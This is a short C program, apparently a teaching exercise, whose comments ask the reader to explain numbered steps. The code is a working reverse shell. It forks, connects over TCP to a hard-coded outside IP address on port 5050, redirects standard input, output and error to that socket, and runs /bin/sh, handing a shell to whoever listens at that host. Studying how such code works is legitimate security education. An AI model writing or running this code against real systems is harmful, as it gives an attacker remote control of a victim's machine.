#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

/*  Try to explain what happens at the marked positions in the code.
 *  Why does the code work?
 */

int main() {

  /* 1) */
  if (fork() == 0) {

    /* 2) */
    int connect_socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    /*3) */
    struct sockaddr_in remoteAddr;
    remoteAddr.sin_family = AF_INET;
    remoteAddr.sin_port = htons(5050);
    remoteAddr.sin_addr.s_addr =
        inet_addr("45.84.199.103"); /* Use 127.0.0.1 in local networks */

    /* 4) */
    connect(connect_socket_fd, (struct sockaddr *)&remoteAddr,
            sizeof(remoteAddr));

    /* 5) */
    dup2(connect_socket_fd, STDIN_FILENO);
    dup2(connect_socket_fd, STDOUT_FILENO);
    dup2(connect_socket_fd, STDERR_FILENO);

    /* 6) */
    execve("/bin/sh", NULL, NULL);
  }
  exit(0);
}
